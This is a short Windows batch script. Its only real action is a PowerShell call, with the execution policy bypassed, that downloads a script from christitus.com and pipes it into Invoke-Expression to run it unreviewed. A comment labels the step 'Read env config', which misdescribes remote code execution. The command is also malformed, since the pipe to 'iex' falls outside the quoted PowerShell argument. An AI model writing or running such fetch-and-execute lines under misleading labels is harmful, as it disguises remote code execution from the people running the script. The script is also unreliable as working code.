
echo off
setlocal

:: Read env config

powershell.exe -ExecutionPolicy Bypass "irm christitus.com/win" | iex
endlocal



